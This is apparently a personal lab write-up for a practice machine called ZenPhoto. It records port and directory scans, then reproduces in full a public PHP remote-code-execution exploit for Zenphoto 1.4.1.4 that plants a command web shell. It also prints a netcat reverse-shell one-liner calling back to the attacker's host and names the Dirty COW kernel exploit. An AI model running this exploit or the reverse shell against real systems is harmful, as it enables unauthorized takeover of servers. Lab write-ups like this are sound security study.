---
Alias: ZenPhoto
Date: {{date}}
Platform: Linux
Difficulty: Intermediate
Tags:
Status: Finished
IP: 192.168.241.41
---

# {{ZenPhoto}}


# Resolution summary
- Ran feroxbuster and ound "/test" directory on port 80
- Found application and version of application within source code of "/test" directory
- Followed the exploit steps and received a reverse shell
- Found kernel version on target machine is 

## Improved skills
- finding application and version in source code

## Used tools
- nmap
- rustscan
- feroxbuster

---

# Information Gathering
Scanned all TCP ports:
```bash
rustscan -a 192.168.241.41 --ulimit 5000       
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
😵 https://admin.tryhackme.com

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 192.168.241.41:22
Open 192.168.241.41:23
Open 192.168.241.41:80
Open 192.168.241.41:3306
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-10 18:14 EDT
Initiating Ping Scan at 18:14
Scanning 192.168.241.41 [2 ports]
Completed Ping Scan at 18:14, 0.12s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 18:14
Completed Parallel DNS resolution of 1 host. at 18:14, 0.01s elapsed
DNS resolution of 1 IPs took 0.08s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 18:14
Scanning 192.168.241.41 [4 ports]
Discovered open port 23/tcp on 192.168.241.41
Discovered open port 80/tcp on 192.168.241.41
Discovered open port 22/tcp on 192.168.241.41
Discovered open port 3306/tcp on 192.168.241.41
Completed Connect Scan at 18:14, 0.08s elapsed (4 total ports)
Nmap scan report for 192.168.241.41
Host is up, received syn-ack (0.093s latency).
Scanned at 2022-05-10 18:14:31 EDT for 1s

PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack
23/tcp   open  telnet  syn-ack
80/tcp   open  http    syn-ack
3306/tcp open  mysql   syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 2.97 seconds



sudo nmap -sC -sV -O 192.168.241.41 -p 22,23,80,3306
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-10 18:18 EDT
Nmap scan report for 192.168.241.41
Host is up (0.080s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 5.3p1 Debian 3ubuntu7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 83:92:ab:f2:b7:6e:27:08:7b:a9:b8:72:32:8c:cc:29 (DSA)
|_  2048 65:77:fa:50:fd:4d:9e:f1:67:e5:cc:0c:c6:96:f2:3e (RSA)
23/tcp   open  ipp     CUPS 1.4
|_http-title: 403 Forbidden
| http-methods: 
|_  Potentially risky methods: PUT
|_http-server-header: CUPS/1.4
80/tcp   open  http    Apache httpd 2.2.14 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.2.14 (Ubuntu)
3306/tcp open  mysql   MySQL (unauthorized)
|_ssl-cert: ERROR: Script execution failed (use -d to debug)
|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)
|_tls-alpn: ERROR: Script execution failed (use -d to debug)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|WAP|terminal|printer|firewall
Running (JUST GUESSING): Linux 3.X|2.6.X|2.4.X (95%), HP embedded (94%), IGEL embedded (93%), Kyocera embedded (92%), IPFire 2.X (92%), Check Point embedded (90%)
OS CPE: cpe:/o:linux:linux_kernel:3.2.0 cpe:/o:linux:linux_kernel:2.6.32 cpe:/h:hp:msm410 cpe:/o:linux:linux_kernel:2.6 cpe:/h:igel:ud3 cpe:/h:kyocera:cs-2560 cpe:/o:ipfire:ipfire:2.11 cpe:/o:linux:linux_kernel:2.4
Aggressive OS guesses: Linux 3.2.0 (95%), Linux 2.6.32 (94%), HP MSM410 WAP (94%), Linux 2.6.35 (93%), IGEL UD3 thin client (Linux 2.6) (93%), Kyocera CopyStar CS-2560 printer (92%), IPFire 2.11 firewall (Linux 2.6.32) (92%), DD-WRT v24-sp1 (Linux 2.4) (91%), Linux 2.6.31 - 2.6.32 (91%), DD-WRT v24-sp1 (Linux 2.4.36) (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 45.27 seconds
```

Enumerated open TCP ports:
```bash
80
```

Enumerated top 200 UDP ports:
```bash

```

---

# Enumeration
## Port 80 - HTTP Apache httpd 2.2.14

#### -Navigated to "target IP" and found the following web page:

#### -Typed "feroxbuster -u [target IP] -C 401 403 405 -x php,txt,json,docx"

feroxbuster -u http://192.168.143.41 -C 401 403 405 -x php,txt,json,docx

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.4.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.143.41
 🚀  Threads               │ 100
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💢  Status Code Filters   │ [401, 403, 405]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.4.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 💲  Extensions            │ [php, txt, json, docx]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200        4l        5w       75c http://192.168.143.41/index
301        9l       28w      315c http://192.168.143.41/test
200      101l      416w     5015c http://192.168.143.41/test/index
301        9l       28w      322c http://192.168.143.41/test/themes
200      101l      416w     5015c http://192.168.143.41/test/index.php
301        9l       28w      322c http://192.168.143.41/test/albums
301        9l       28w      323c http://192.168.143.41/test/plugins
301        9l       28w      321c http://192.168.143.41/test/cache
301        9l       28w      330c http://192.168.143.41/test/themes/default
200        0l        0w        0c http://192.168.143.41/test/themes/default/contact
301        9l       28w      337c http://192.168.143.41/test/themes/default/images
200        0l        0w        0c http://192.168.143.41/test/themes/default/index
200        0l        0w        0c http://192.168.143.41/test/themes/default/register
200        0l        0w        0c http://192.168.143.41/test/themes/default/contact.php
200        0l        0w        0c http://192.168.143.41/test/themes/default/index.php
200        0l        0w        0c http://192.168.143.41/test/themes/default/register.php
200        0l        0w        0c http://192.168.143.41/test/themes/default/image
200        0l        0w        0c http://192.168.143.41/test/themes/default/image.php
200        0l        0w        0c http://192.168.143.41/test/themes/default/password
200        1l        2w     1406c http://192.168.143.41/test/favicon
200        8l       16w      190c http://192.168.143.41/test/robots
200        8l       16w      190c http://192.168.143.41/test/robots.txt
301        9l       28w      337c http://192.168.143.41/test/themes/default/styles
[####################] - 15m  7719075/7719075 0s      found:23      errors:1436189
[####################] - 12m  1102725/1102725 1500/s  http://192.168.143.41
[####################] - 12m  1102725/1102725 1478/s  http://192.168.143.41/test
[####################] - 11m  1102725/1102725 1543/s  http://192.168.143.41/test/themes
[####################] - 14m  1102725/1102725 1279/s  http://192.168.143.41/test/albums
[####################] - 11m  1102725/1102725 1565/s  http://192.168.143.41/test/plugins
[####################] - 14m  1102725/1102725 1243/s  http://192.168.143.41/test/cache
[####################] - 11m  1102725/1102725 1617/s  http://192.168.143.41/test/themes/default


#### -Per the previous feroxbuster results I navigated to "http://[target IP]/test" and found the following web page which shows it is being run by Zenphoto:

![](Images/Pasted%20image%2020221111200923.png)

#### -Read the source page of "feroxbuster -u [http://[target IP]/test" and found Zenphoto version 1.4.1.4:

![](Images/Pasted%20image%2020221111200956.png)

#### -Googled "Zenphoto version 1.4.1.4 exploit" and found the following:
#ZenPhoto

```php
<?php

/*
    --------------------------------------------------------------------------
    Zenphoto <= 1.4.1.4 (ajax_create_folder.php) Remote Code Execution Exploit
    --------------------------------------------------------------------------
    
    author............: Egidio Romano aka EgiX
    mail..............: n0b0d13s[at]gmail[dot]com
    software link.....: http://www.zenphoto.org/
    
    +-------------------------------------------------------------------------+
    | This proof of concept code was written for educational purpose only.    |
    | Use it at your own risk. Author will be not responsible for any damage. |
    +-------------------------------------------------------------------------+
    
    [-] Vulnerability overview:
    
    All versions of Zenphoto from 1.2.4 to 1.4.1.4 are affected by the
    vulnerability that I reported to http://www.exploit-db.com/exploits/18075/
    
    [-] Disclosure timeline:
    
    [21/10/2011] - Vulnerability discovered
    [24/10/2011] - Issue reported to http://www.zenphoto.org/trac/ticket/2005
    [31/10/2011] - Fix released with version 1.4.1.5
    [05/11/2011] - Public disclosure

*/

error_reporting(0);
set_time_limit(0);
ini_set("default_socket_timeout", 5);

function http_send($host, $packet)
{
    if (!($sock = fsockopen($host, 80)))
        die( "\n[-] No response from {$host}:80\n");

    fwrite($sock, $packet);
    return stream_get_contents($sock);
}

print "\n+-----------------------------------------------------------+";
print "\n| Zenphoto <= 1.4.1.4 Remote Code Execution Exploit by EgiX |";
print "\n+-----------------------------------------------------------+\n";

if ($argc < 3)
{
    print "\nUsage......: php $argv[0] <host> <path>\n";
    print "\nExample....: php $argv[0] localhost /";
    print "\nExample....: php $argv[0] localhost /zenphoto/\n";
    die();
}

$host = $argv[1];
$path = $argv[2];

$payload = "foo=<?php error_reporting(0);print(_code_);passthru(base64_decode(\$_SERVER[HTTP_CMD]));die; ?>";
$packet  = "POST {$path}zp-core/zp-extensions/tiny_mce/plugins/ajaxfilemanager/ajax_create_folder.php HTTP/1.0\r\n";
$packet .= "Host: {$host}\r\n";
$packet .= "Content-Length: ".strlen($payload)."\r\n";
$packet .= "Content-Type: application/x-www-form-urlencoded\r\n";
$packet .= "Connection: close\r\n\r\n{$payload}";

http_send($host, $packet);

$packet  = "GET {$path}zp-core/zp-extensions/tiny_mce/plugins/ajaxfilemanager/inc/data.php HTTP/1.0\r\n";
$packet .= "Host: {$host}\r\n";
$packet .= "Cmd: %s\r\n";
$packet .= "Connection: close\r\n\r\n";

while(1)
{
    print "\nzenphoto-shell# ";
    if (($cmd = trim(fgets(STDIN))) == "exit") break;
    preg_match("/_code_(.*)/s", http_send($host, sprintf($packet, base64_encode($cmd))), $m) ?
    print $m[1] : die("\n[-] Exploit failed!\n");
}

?>
```


---

# Exploitation
## Zenphoto version 1.4.1.4 exploit

#### -Input the above script into a file named "shell.php" on kali machine

#### -Typed "php shell.php 192.168.53.41 /test/" on kali machine and received the below restricted shell:

![](Images/Pasted%20image%2020221111201606.png)

#### -Started penelope listener on kali machine running on port 80

#### -Typed "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 	[kali tun0 IP]:80 >/tmp/f" and received a stable shell:

![](Images/Pasted%20image%2020221111201646.png)

---

# Privilege Escalation
## Local Enumeration

#### -Navigated to "/var/www/html/zp-data", cat'd file "zp-config.php" and found the below credentials to login to mysql database:

$conf['mysql_user'] = 'root';           // Supply your Database user id.
$conf['mysql_pass'] = 'hola';           // Supply your Database password.
$conf['mysql_host'] = 'localhost';  // Supply the name of your Database server.
$conf['mysql_database'] = 'zenphoto';       // Supply the name of Zenphoto's database 

![](Images/Pasted%20image%2020221111202027.png)

![](Images/Pasted%20image%2020221111202056.png)

#### -Uploaded and ran"linpeas.sh" on target machine 

#### -Was unable to find any privilege escalation vectors from output so I googled "Linux 2.6.32 exploit" as from the linpeas output it showed target machine running OS Linux 2.6.32. Found the following link/web page:

![](Images/Pasted%20image%2020221111202136.png)

![](Images/Pasted%20image%2020221111202158.png)

![](Images/Pasted%20image%2020221111202226.png)



## Privilege Escalation vector
## CVE-2016-5195 - Linux Kernel 2.6.22 < 3.9 - 'Dirty COW' Privilege Escalation

#### -Followed the steps for the exploit and received root privileges for target machine:

![](Images/Pasted%20image%2020221111202310.png)

---

